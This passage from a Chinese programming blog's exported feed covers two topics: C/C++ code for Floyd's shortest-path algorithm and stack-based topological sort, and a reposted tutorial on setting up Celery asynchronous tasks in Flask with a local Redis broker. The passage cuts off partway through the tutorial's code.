class="line">&#125;</span><br><span class="line">d++;</span><br><span class="line">aPath[d] = i;<span class="comment">//路径上添加起点</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, aPath[d]);<span class="comment">//输出起点</span></span><br><span class="line"><span class="keyword">for</span> (s = d - <span class="number">1</span>; s &gt;= <span class="number">0</span>; s--) &#123;<span class="comment">//输出路径上其他顶点</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;-&gt;%d&quot;</span>, aPath[s]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t\t&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;路径长度为：%d\n&quot;</span>, A[i][j]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Floyd算法</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Floyd</span><span class="params">(MatGraph MG)</span> &#123;</span><br><span class="line"><span class="type">int</span> i, j, k;</span><br><span class="line"><span class="type">int</span> A[MAXV][MAXV];</span><br><span class="line"><span class="type">int</span> path[MAXV][MAXV];</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MG.n; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; MG.n; j++) &#123;</span><br><span class="line">A[i][j] = MG.adjMat[i][j];</span><br><span class="line"><span class="keyword">if</span> (i != j &amp;&amp; MG.adjMat[i][j] &lt; INF) &#123;</span><br><span class="line">path[i][j] = i;<span class="comment">//顶点 i 到顶点 j 有边时</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">path[i][j] = <span class="number">-1</span>;<span class="comment">//顶点 i 到顶点 j 无边时</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; MG.n; k++) &#123;<span class="comment">//一次考察所有顶点</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MG.n; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; MG.n; j++) &#123;</span><br><span class="line"><span class="keyword">if</span> (A[i][j] &gt; A[i][k] + A[k][j]) &#123;</span><br><span class="line">A[i][j] = A[i][k] + A[k][j];<span class="comment">//修改最短路径长度</span></span><br><span class="line">path[i][j] = path[k][j];<span class="comment">//修改最短路径</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">displayPath(MG, A, path);<span class="comment">//输出最短路径</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">ListGraph* LG;</span><br><span class="line">MatGraph MG;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="built_in">array</span>[MAXV][MAXV] = &#123;</span><br><span class="line">&#123;  <span class="number">0</span>,  <span class="number">4</span>,  <span class="number">6</span>,  <span class="number">6</span>,INF,INF,INF&#125;,</span><br><span class="line">&#123;INF,  <span class="number">0</span>,  <span class="number">1</span>,INF,  <span class="number">7</span>,INF,INF&#125;,</span><br><span class="line">&#123;INF,INF,  <span class="number">0</span>,INF,  <span class="number">6</span>,  <span class="number">4</span>,INF&#125;,</span><br><span class="line">&#123;INF,INF,  <span class="number">2</span>,  <span class="number">0</span>,INF,  <span class="number">5</span>,INF&#125;,</span><br><span class="line">&#123;INF,INF,INF,INF,  <span class="number">0</span>,INF,  <span class="number">6</span>&#125;,</span><br><span class="line">&#123;INF,INF,INF,INF,  <span class="number">1</span>,  <span class="number">0</span>,  <span class="number">8</span>&#125;,</span><br><span class="line">&#123;INF,INF,INF,INF,INF,INF,  <span class="number">0</span>&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> e = <span class="number">12</span>;</span><br><span class="line">createAdjListGraph(LG, <span class="built_in">array</span>, MAXV, e);</span><br><span class="line">displayAdjList(LG);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">ListToMat(LG, MG);</span><br><span class="line">displayAdjMat(MG);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">Floyd(MG);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结果:<br><img src="https://img-blog.csdnimg.cn/cbefb6ddae0641b98c6869893181943a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWTFzZWNv,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><a href="https://blog.csdn.net/qq_51462776/article/details/122148626?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164448438616780255294556%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=164448438616780255294556&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-8-122148626.first_rank_v2_pc_rank_v29&amp;utm_term=floyd%E7%AE%97%E6%B3%95c%2B%2B&amp;spm=1018.2226.3001.4187">参考文章 1</a><br><a href="https://blog.csdn.net/weixin_42109012/article/details/94217203?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164448438616780265420631%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=164448438616780265420631&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-94217203.first_rank_v2_pc_rank_v29&amp;utm_term=floyd%E7%AE%97%E6%B3%95c%2B%2B&amp;spm=1018.2226.3001.4187"> 参考文章 2</a></p><h2 id="拓扑排序"><a class="markdownIt-Anchor" href="#拓扑排序">#</a> 拓扑排序</h2><h3 id="原理"><a class="markdownIt-Anchor" href="#原理">#</a> 原理</h3><ol><li>从 AOV 网中选择一个没有前驱的顶点并输出.</li><li>从网中删除该顶点和所有以它为起点的有向边.</li><li>重复直至 AOV 网为空或当前网中不存在无前驱的顶点为止。后一种情况说明有向图中必然存在环.</li></ol><h3 id="栈实现拓扑排序邻接表实现"><a class="markdownIt-Anchor" href="#栈实现拓扑排序邻接表实现">#</a> 栈实现拓扑排序（邻接表实现）</h3><p><img src="https://img-blog.csdnimg.cn/b65b8230b9dc460aaa883c8881baa1b2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWTFzZWNv,size_15,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_VERTEX_NUM 26</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ArcNode</span> &#123;</span></span><br><span class="line"><span class="type">int</span> adjvex;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ArcNode</span> *<span class="title">nextarc</span>;</span></span><br><span class="line">ArcNode() &#123;</span><br><span class="line">nextarc = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; ArcNode; <span class="comment">//结点</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">VNode</span> &#123;</span></span><br><span class="line"><span class="type">int</span> data;</span><br><span class="line">ArcNode *firstarc;</span><br><span class="line">VNode() &#123;</span><br><span class="line">firstarc = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; VNode, AdjList[MAX_VERTEX_NUM];</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">AdjList vertices;</span><br><span class="line"><span class="type">int</span> vexnum, arcnum;</span><br><span class="line">&#125; ALGraph;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">TopologicalSort</span><span class="params">(ALGraph G, <span class="type">int</span> *indegree)</span> &#123;</span><br><span class="line"><span class="built_in">stack</span>&lt;<span class="type">int</span>&gt; s;<span class="comment">//初始化栈</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> i, k;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; G.vexnum + <span class="number">1</span>; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (!indegree[i])</span><br><span class="line">s.push(i); <span class="comment">//入度为0的顶点入栈</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> count = <span class="number">0</span>;<span class="comment">//记录当前已经输出的顶点数</span></span><br><span class="line">ArcNode *p;</span><br><span class="line"><span class="keyword">while</span> (!s.empty()) &#123;</span><br><span class="line">i = s.top();</span><br><span class="line">s.pop();</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; G.vertices[i].data &lt;&lt; <span class="string">&quot;-&gt;&quot;</span>;</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">for</span> (p = G.vertices[i].firstarc; p; p = p-&gt;nextarc) &#123;</span><br><span class="line">k = p-&gt;adjvex;</span><br><span class="line">indegree[k]--; <span class="comment">//将所有指向i的顶点的入度减一，并且将入度为0的顶点压入栈s</span></span><br><span class="line"><span class="keyword">if</span> (!indegree[k])</span><br><span class="line">s.push(k);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (count &lt; G.vexnum)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line">ALGraph g;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;载入图中...&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">ifstream <span class="title function_">fin</span><span class="params">(<span class="string">&quot;in.txt&quot;</span>)</span>;</span><br><span class="line">fin &gt;&gt; g.vexnum &gt;&gt; g.arcnum;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; g.vexnum + <span class="number">1</span>; i++)</span><br><span class="line">g.vertices[i].data = i;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> b, e;</span><br><span class="line">ArcNode *p;</span><br><span class="line"><span class="type">int</span> *indegree = new <span class="type">int</span>[g.vexnum + <span class="number">1</span>];</span><br><span class="line"><span class="comment">//注意 int *a=new int(n);  申请一个整型变量空间，赋初值为n，并定义一个整型指针a指向该地址空间</span></span><br><span class="line"><span class="comment">//int *indegree=(int *)malloc(sizeof(int)*(g.vexnum+1));</span></span><br><span class="line"><span class="built_in">memset</span>(indegree, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="type">int</span>) * (g.vexnum + <span class="number">1</span>));</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; g.arcnum + <span class="number">1</span>; i++) &#123;</span><br><span class="line">fin &gt;&gt; b &gt;&gt; e;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;第&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;条边：&quot;</span> &lt;&lt; b &lt;&lt; <span class="string">&quot;-&gt;&quot;</span> &lt;&lt; e &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">p = new ArcNode();</span><br><span class="line">p-&gt;adjvex = e;</span><br><span class="line">p-&gt;nextarc = g.vertices[b].firstarc;</span><br><span class="line">g.vertices[b].firstarc = p;</span><br><span class="line">indegree[e]++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (TopologicalSort(g, indegree))</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;正常完成！&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;该有向图有回路！&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试数据，新建 in.txt 文件输入内容</p><blockquote><p>1）有环<br> 4 4<br>1 2<br>2 3<br>3 4<br>4 2</p></blockquote><blockquote><p>2）无环<br> 12 16<br>1 2<br>1 3<br>2 3<br>1 4<br>3 5<br>4 5<br>11 6<br>5 7<br>3 7<br>3 8<br>6 8<br>9 10<br>9 11<br>9 12<br>10 12<br>1 12</p></blockquote><p>结果:<br><img src="https://img-blog.csdnimg.cn/0e6f89b0f60c414f82b79bc6716940c1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWTFzZWNv,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2d977aa607744bd181fc042e13f2ce20.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWTFzZWNv,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p><a href="https://blog.csdn.net/ywcpig/article/details/52599867?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164448334116780264052450%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=164448334116780264052450&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-52599867.first_rank_v2_pc_rank_v29&amp;utm_term=%E6%8B%93%E6%89%91%E6%8E%92%E5%BA%8Fc%2B%2B&amp;spm=1018.2226.3001.4187">参考文章</a><br><a href="https://cloud.tencent.com/developer/article/1569368"> https://cloud.tencent.com/developer/article/1569368</a></p>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>flask配置celery异步任务</title>
      <link href="/2022/02/13/flask%E9%85%8D%E7%BD%AE%E5%BC%82%E6%AD%A5%E4%BB%BB%E5%8A%A1/"/>
      <url>/2022/02/13/flask%E9%85%8D%E7%BD%AE%E5%BC%82%E6%AD%A5%E4%BB%BB%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<p>flask 配置 celery 异步任务</p><span id="more"></span><h3 id="前言"><a class="markdownIt-Anchor" href="#前言">#</a> 前言<a href="https://www.cnblogs.com/wxhou/p/14399237.html#%E5%89%8D%E8%A8%80">#</a></h3><blockquote><p>转载自：<a href="https://www.cnblogs.com/wxhou/p/14399237.html">https://www.cnblogs.com/wxhou/p/14399237.html</a></p></blockquote><p>在使用 flask 开发的时候，接口的返回需要很少的时间，所以我们需要将一些耗时的任务，放到异步后台去处理，例如：发送邮件，耗时的 CPU 任务等。在 python web 框架中 celery 这个库，可能是最合适的。</p><p>由于我使用 flask 的时间比较多，但是当我想把 celery 很好的与 flask 进行集成的时候，却发现并不是那么如意。花费了很久的时间去实践最后却是各种报错。出现了循环导入、app 上下文、tasks not found 等问题，尝试了种种却总是不如人意。</p><p>好在功夫不负有心人，在结合官方文档并查阅了大量资料后，终于把 celery 很好得集成在了 flask 项目中。我在这里记录一下，同时也希望对你们有所帮助。</p><h3 id="配置"><a class="markdownIt-Anchor" href="#配置">#</a> 配置<a href="https://www.cnblogs.com/wxhou/p/14399237.html#%E9%85%8D%E7%BD%AE">#</a></h3><table><thead><tr><th>开发环境</th><th>Windows10</th></tr></thead><tbody><tr><td>python</td><td>3.8.6</td></tr><tr><td>flask</td><td>2.0.x</td></tr><tr><td>celery</td><td>5.x</td></tr><tr><td>broker</td><td>redis</td></tr><tr><td>pool</td><td>eventlet</td></tr></tbody></table><h3 id="simple模式"><a class="markdownIt-Anchor" href="#simple模式">#</a> simple 模式<a href="https://www.cnblogs.com/wxhou/p/14399237.html#simple%E6%A8%A1%E5%BC%8F">#</a></h3><p>由于 celery 5.0 后推荐小写模式，与 flask config 大写规范有冲突，所以我们当同目录下创建一个 <code>celeryconfig.py</code>  文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">celeryconfig.py</span><br><span class="line">broker_url=&#x27;redis://127.0.0.1:6379/1&#x27;</span><br><span class="line">result_backend=&#x27;redis://127.0.0.1:6379/2&#x27;</span><br></pre></td></tr></table></figure><p>flask simple 模式。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">simple.py</span><br><span class="line">from flask import Flask</span><br><span class="line">from celery import Celery</span><br><span class="line">import celeryconfig</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">celery_app = Celery(app.import_name,</span><br><span class="line">                    broker=celeryconfig.broker_url,</span><br><span class="line">                    backend=celeryconfig.result_backend)</span><br><span class="line">celery_app.config_from_object(celeryconfig)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@celery_app.task(name=&#x27;simple/add2&#x27;)</span><br><span class="line">def add2(x, y):</span><br><span class="line">    return x + y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    results = add2.delay(3, 5)</span><br><span class="line">    return str(results.wait())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(debug=True)</span><br></pre></td></tr></table></figure><p>这些就是单文件模式的代码，这其中我们添加了一个任务 <code>add2</code> ，然后启动 flask。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python simple.py</span><br></pre></td></tr></table></figure><p>由于 celery 和 flask 是同级别的 app，所以我们需要一个新的窗口启动 celery，加入 - P 参数指定异步 worker <code>eventlet</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">celery -A simple.celery_app worker -l info -P eventlet</span><br></pre></td></tr></table></figure><p>当我们启动 celery 之后。看到最后一行的 ready 的时候，说明我们的 celery 已经启动成功了。</p><p>然后再看有下面标识说明我们的任务已经被添加成功了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[tasks]</span><br><span class="line">  . simple/add2</span><br></pre></td></tr></table></figure><p>访问网址：<a href="http://127.0.0.1:5000/">http://127.0.0.1:5000/</a></p><p><a href="https://i.loli.net/2021/02/11/Ra9sxpLWX4VoyMm.png"><img src="https://i.loli.net/2021/02/11/Ra9sxpLWX4VoyMm.png" alt="image-20210211174559291"></a></p><p>同时我们查看一下 celery 的窗口：</p><p><a href="https://i.loli.net/2021/02/11/n6HB8XSlOT5uRmM.png"><img src="https://i.loli.net/2021/02/11/n6HB8XSlOT5uRmM.png" alt="image-20210211174707759"></a></p><p>simple 模式就结束了</p><h3 id="factory模式"><a class="markdownIt-Anchor" href="#factory模式">#</a> Factory 模式<a href="https://www.cnblogs.com/wxhou/p/14399237.html#factory%E6%A8%A1%E5%BC%8F">#</a></h3><p>当然我们如果用 flask 写一个稍微复杂的东西的话，其实工厂模式我们应该用的更多。下面我们一起来看看工厂模式中的配置。</p><h4 id="目录结构"><a class="markdownIt-Anchor" href="#目录结构">#</a> 目录结构<a href="https://www.cnblogs.com/wxhou/p/14399237.html#%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84">#</a></h4><p>首先我们先规划一个 flask+celery 的目录结构。然后创建下面的文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── app</span><br><span class="line">│   ├── __init__.py  ——app主体文件</span><br><span class="line">│   ├── celeryconfig.py           ——celery配置文件</span><br><span class="line">│   ├── config.py  ——flask配置文件</span><br><span class="line">│   ├── models.py  ——模型文件</span><br><span class="line">│   ├── tasks.py  ——后台任务</span><br><span class="line">│   └── views.py  ——视图文件</span><br><span class="line">├── data.db</span><br><span class="line">├── .flaskenv      ——flask环境变量</span><br><span class="line">└── server.py  ——运行文件</span><br></pre></td></tr></table></figure><p>我们先创建一个注册 celery 的函数，主要功能是使用 flask 应用上下文。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">register_celery</span>(<span class="params">celery, app</span>):</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">ContextTask</span>(celery.Task):</span><br><span class="line">        abstract = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">__call__</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">            <span class="keyword">with</span> app.app_context():</span><br><span class="line">                <span class="keyword">return</span> self.run(*args, **kwargs)</span><br><span class="line"></span><br><span class="line">    celery.Task = ContextTask</span><br></pre></td></tr></table></figure><p>然后我们创建 create_app 函数，将写好的注册 celery 函数加进去。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">create_app</span>(<span class="params">**kwargs</span>):</span><br><span class="line">    app = Flask(__name__)</span><br><span class="line">    app.config.from_pyfile(<span class="string">&#x27;config.py&#x27;</span>)</span><br><span class="line">    db.init_app(app)</span><br><span class="line">    register_celery(celery=kwargs.get(<span class="string">&#x27;celery&#x27;</span>), app=app)  <span class="comment"># &gt;&gt; 注册celery</span></span><br><span class="line">    register_blueprints(app) </span><br><span class="line">    register_commands(app)</span><br><span class="line">    <span class="keyword">return</span> app</span><br></pre></td></tr></table></figure><p>上面这些都是我们在 <code>__init__</code> 文件中创建的，下面我们来创建 celery 的 app</p><p><a href="http://xn--server-oi2ls3t.py">打开 server.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> celery <span class="keyword">import</span> Celery</span><br><span class="line"><span class="keyword">from</span> app <span class="keyword">import</span> create_app, celeryconfig</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_celery</span>(<span class="params">app_name</span>):</span><br><span class="line">    celery = Celery(app_name,</span><br><span class="line">                    broker=celeryconfig.broker_url,</span><br><span class="line">                    backend=celeryconfig.result_backend)</span><br><span class="line">    celery.config_from_object(celeryconfig)</span><br><span class="line">    <span class="keyword">return</span> celery</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">my_celery = make_celery(__name__)</span><br><span class="line"></span><br><span class="line">app = create_app(celery=my_celery)</span><br></pre></td></tr></table></figure><p>我们把 celery 配置文件和 flask 工厂应用导入进来。然后创建 make_celery 函数生成 celery 应用。</p><p>生成 celery 应用后把 celery 传入到 flask 应用函数中去。这样把<strong>生成</strong>和<strong>注册</strong>分开写，解决了循环导入的问题。</p><p>接着我们创建一个 tasks.py 文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> server <span class="keyword">import</span> my_celery</span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> db, Message</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@my_celery.task()</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add2</span>(<span class="params">msg</span>):</span><br><span class="line">    message = Message(details=msg)</span><br><span class="line">    db.session.add(message)</span><br><span class="line">    db.session.commit()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;success&quot;</span></span><br></pre></td></tr></table></figure><p>从 server 文件中导入 celery 应用，然后创建任务。</p><p>然后在视图中引用任务。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Blueprint, jsonify</span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> db, Message</span><br><span class="line"><span class="keyword">from</span> .tasks <span class="keyword">import</span> add2</span><br><span class="line"></span><br><span class="line">th = Blueprint(<span class="string">&#x27;&#x27;</span>, __name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@th.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    res = add2.delay(<span class="string">&quot;hello word&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> 